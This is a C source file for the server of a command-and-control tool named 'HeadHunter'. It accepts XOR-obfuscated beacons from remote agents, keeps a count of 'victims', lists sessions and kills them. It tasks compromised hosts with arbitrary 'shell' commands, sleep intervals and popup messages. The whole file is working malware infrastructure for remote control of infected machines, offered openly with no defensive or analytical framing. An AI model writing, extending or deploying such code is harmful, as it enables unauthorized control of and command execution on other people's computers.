#include <stdio.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>

extern char* key;
extern int keylen;


void* BeaconRecv(void* arg){

        int fd = *((int *) arg);
        char beacon[MAXBUF];
        int n;
        char* response = "--HEADHUNTER NO--";
        char* xorresponse = XOR(response, key, strlen(response), keylen);

        while(((n = recv(fd, beacon, MAXBUF, 0)) > 0)){
                char* xorbeacon = XOR(beacon, key, n, keylen);
                if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){
                        for(int i = 0; i < max_clients; i++){
                                if(client_socket[i] == fd){
                                        gettimeofday(&last_check[i], NULL);
                                }
                        }
                        send(fd, xorresponse, strlen(response), 0);
                }
                free(xorbeacon);
        }
        return NULL;
}

int server_control_session(){
    int n;
    char buffer[MAXBUF];
    int selected_id;
    char* status = "";
    printf(PROMPT);
    fflush(NULL);
    while((n = read(a.src, buffer, MAXBUF)) > 0){

        if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
            printf("\nHeadHunter Control Server Commands:\n");

	          printf("==========================================\n");
            printf("help                     List all available commands\n");
            printf("show sessions            List active connections\n");
            printf("use <session id>         Switch session to specified connection by id\n");
	          printf("kill <session id>        Task agent to die and close connection by id\n");
            printf("exit                     Close headhunter\n\n");

        } else if (strcmp(newline_terminator(buffer), "show sessions\n") == 0 || strcmp(newline_terminator(buffer), "show connections\n") == 0 || strcmp(newline_terminator(buffer), "show\n") == 0 || strcmp(newline_terminator(buffer), "show \n") == 0) {
            printf("\nID          Address                  Status \n--------------------------------------------------------------\n");
            for (int i = 0; i < max_clients; i++){
                if (client_socket[i] == 0){ continue; }	// Continue just in case there is a random NULL socket
		if(client_status[i] == 1){status = "\e[1;32m[+]\e[0m Active";}
		else{status = "\e[1;31m[-]\e[0m Inactive";}
		struct timeval current;
		gettimeofday(&current, NULL);
		time_t diff_sec = current.tv_sec - last_check[i].tv_sec;
		if(diff_sec > 600){status = "\e[1;31m[-]\e[0m Inactive";}
                printf("%-12d%-25s%s %ld seconds ago\n", i + 1, get_socket_addr(client_socket[i]), status, diff_sec);
            }
	    printf("\n");
        } else if (str_starts_with(buffer, "use") == 0) {
            selected_id = 0;

	    char* value = split(buffer, " ");
	    int selected_value = atoi(value);
            selected_id += selected_value;
	    
            if (selected_id < 1) {
                printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
            }
	    else if(client_socket[selected_id-1] == 0){
                printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
	    } 
	    else {
                printf("\e[1;34m[*]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
                printf("Type \"bg\" to background agent control session\n");
		
		if(threads[selected_id-1] != 0){

			pthread_cancel(threads[selected_id-1]);
			threads[selected_id-1] = 0;
		}

                selected_id += 3;
                return selected_id;
            }
   	}
        else if (str_starts_with(buffer, "kill") == 0){
		
		selected_id = 0;
	    	char* value = split(buffer, " ");
		int selected_value = atoi(value);
		
		selected_id += selected_value;
		

		if (selected_id < 1){
			printf("\e[1;31m[-]\e[0m Invalid id!\n\n");
		} 
		else if(client_socket[selected_id-1] == 0){
                	printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
            	} 
		else{
			printf("\e[1;34m[*]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
			selected_id += 3;
			for(int i = 0; i < max_clients; i++){
				if(client_socket[i] == selected_id){
					char* exit = "--HEADHUNTER EXIT--\n";
					char* xorexit = XOR(exit, key, strlen(exit), keylen);
					send(client_socket[i], xorexit, strlen(exit), 0);
					close(client_socket[i]);

					victim_count--;
					client_socket[i] = 0;
					printf("\e[1;32m[+]\e[0m Control session: %d successfully killed.\n", selected_id - 3);
				}
				
				else if(i == max_clients){
					printf("\e[1;31m[-]\e[0m Could not find socket to kill.\n");
				}
			}
		}


	} else if (strcmp(buffer, "exit\n") == 0 || strcmp(buffer, "exit\n\n") == 0){
            printf("Exiting server control session...\n");
            return -1;
        } else if(strcmp(buffer, "\n") == 0 || strcmp(buffer, "\n\n") == 0){
        } else {
	    printf("Exec: %s\n", buffer);
	    system(buffer);
        }
        printf(PROMPT);
        fflush(NULL);
        for (int i = 0; i < MAXBUF; i++){ buffer[i] = '\0'; }  // Clear buffer
    }
    printf("The program is bad\n");
    fflush(NULL); sync();
    return -1;
}

void *Socket_Reader(){
    // Intercept incoming data from the current victim socket
    char buffer[MAXBUF];
    int n;
    char* xorbuffer;
    char* response = "--HEADHUNTER NO--";
    char* xorresponse = XOR(response, key, strlen(response), keylen);

    printf(hunterPROMPT);

    fflush(NULL);
    while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {


	    xorbuffer = XOR(buffer, key, n, keylen);
	    if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
        
		for(int i = 0; i < max_clients; i++){
	    	    if(client_socket[i] == a.dest){
		    	client_status[i] = 1;
			    gettimeofday(&last_check[i], NULL);
		    }
        	}

        
        	if(a.beaconbufsize > 0){
            		
			char* xorcommand = XOR(a.beaconbuf, key, a.beaconbufsize, keylen);
            		send(a.dest, xorcommand, a.beaconbufsize, 0);       
			a.beaconbufsize = 0;
			free(xorcommand);
		}
		else{
			send(a.dest, xorresponse, strlen(response), 0);
		}

		free(xorbuffer);
		continue;
	    }

	printf("\e[1;32m[+]\e[0m Received %li bytes\n", strlen(xorbuffer));

	if(a.kill == 0){
		printf(hunterPROMPT);
	}

        if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
            printf("Error in function write()\n");

        fflush(NULL);
        fflush(NULL);

	memset(xorbuffer, '\0', strlen(xorbuffer));
	memset(buffer, '\0', strlen(buffer));
    }

    if (n < 0)
        printf("Error in function read()\n");

    a.kill = 1;
    memset(xorbuffer, '\0', strlen(xorbuffer));
    memset(buffer, '\0', strlen(buffer));    
    return NULL;
}

// *****************************************************
// *****************************************************
// *****************************************************

void *Socket_Writer()
{
    // Reads data from stdin and writes to socket
    int n;
    char buffer[MAXBUF];

    while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF)) > 0)
    {
        if (strcmp(newline_terminator(buffer), "bg\n") == 0) {
	    
            printf("Backgrounding session...\n");
            a.kill = 1;

	    int *arg = malloc(sizeof(*arg));
	    *arg = a.dest;

	    for(int i = 0; i < max_clients; i++){
		if(client_socket[i] == a.dest){
			pthread_create(&threads[i], NULL, BeaconRecv, arg);
		}
	    }
            return NULL;
        } 
	else if(strcmp(newline_terminator(buffer), "\n") == 0){
		printf(hunterPROMPT);
		fflush(NULL);
	}
	else if(strcmp(newline_terminator(buffer), "help\n") == 0){
		printf("\nHunter Agent v1.0 Commands\n");
		printf("================================\n");
		printf("\nshell <command>          task the agent to run a command\n");
		printf("sleep <seconds>            task the agent to sleep for a specified time\n");
		printf("msg <message>              task the agent to execute a popup message\n");
		printf("help                       displays this menu\n");
		printf("bg                         backgrounds the agent command session\n");
		printf("exit                       tasks the agent to exit\n\n");

		printf(hunterPROMPT);
		fflush(NULL);
	}
	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
	
	    printf("\e[1;34m[*]\e[0m Tasking agent with exit\n");	

	    char* exit = "--HEADHUNTER EXIT--";
	    char* xorexit = XOR(exit, key, strlen(exit), keylen);
	    send(a.dest, xorexit, strlen(exit), 0);

	    for(int i = 0; i < max_clients; i++){
	    	if(client_socket[i] == a.dest){
			close(client_socket[i]);

	    		a.kill = 1;
			victim_count--;
			client_socket[i] = 0;
			printf("\e[1;32m[+]\e[0m Control session: %d successfully exited.\n", a.dest - 3);
	
		}
				
		else if(i == max_clients){
			printf("\e[1;31m[-]\e[0m Could not find socket to close.\n");
		}
	    }

	    return NULL;
	}

	else {

	    if(str_starts_with(buffer, "shell") == 0 || str_starts_with(buffer, "sleep") == 0 || str_starts_with(buffer, "msg") == 0){ 	
	   
	    	printf("\n\e[1;34m[*]\e[0m Tasking agent with command\n");
	   	a.beaconbufsize = n;
	   	a.beaconbuf = buffer;
            }
	    else{
		printf("Invalid command, type \"help\" to list commands\n");
		printf(hunterPROMPT);
		fflush(NULL);
	    }
	    //free(xorbuffer);
        }
    }

    if (n < 0)
        printf("n is: %i Error in function thread read()\n", n);

    a.kill = 1;
    return NULL;
}

// *****************************************************
// *****************************************************
// *****************************************************

void *Acceptor(){
    FD_SET(master_socket, &readfds);  // assigned master socket to the set
    for (i = 0; i < max_clients; i++)  // sets array of socket fds to zero so not read
        client_socket[i] = 0;

    while(1){
        FD_ZERO(&readfds);
        FD_SET(master_socket, &readfds);
        max_sd = master_socket;

        // add child sockets to set
        for ( i = 0 ; i < max_clients ; i++){
            // socket descriptor
            sd = client_socket[i];

            // if valid socket descriptor then add to read list
            if(sd > 0)
                FD_SET( sd , &readfds);

            // highest file descriptor number, need it for the select function
            if(sd > max_sd)
                max_sd = sd;
        }

        // wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
        activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);

        if ((activity < 0) && (errno!=EINTR)) {}

        if (FD_ISSET(master_socket, &readfds)) {

            //wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
            activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);

            if ((activity < 0) && (errno!=EINTR)) {}

            if (FD_ISSET(master_socket, &readfds)) {

		if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
                    perror("accept");
                    exit(EXIT_FAILURE);
                }

                // add new socket to an array of sockets
		int *arg = malloc(sizeof(*arg));

                for (i = 0; i < max_clients; i++) {
                    // only if position is empty
                    if( client_socket[i] == 0 ){
			
			char beacon[MAXBUF];
            		char* response = "--HEADHUNTER NO--";
            		char* xorresponse = XOR(response, key, strlen(response), keylen);
			int n = recv(new_socket, beacon, MAXBUF, 0);
			char* xorbeacon = XOR(beacon, key, n, keylen);
			if(str_starts_with(xorbeacon, "--HEADHUNTER BEACON--") == 0){

                        	client_socket[i] = new_socket;
                        	victim_count++;
				int *arg = malloc(sizeof(*arg));

				*arg = client_socket[i];
				pthread_create(&threads[i], NULL, BeaconRecv, arg);

				client_status[i] = 1;
				gettimeofday(&last_check[i], NULL);
                send(client_socket[i], xorresponse, strlen(response), 0);
				*arg = client_socket[i];

                        	printf("\n\e[1;32m[+]\e[0m Beacon received from %s\n", get_socket_addr(new_socket));
                        	printf("Press enter or type a command to resume previous session\n\n");
			}

                        break;
                    }
                }
	    }
        }
    }
}
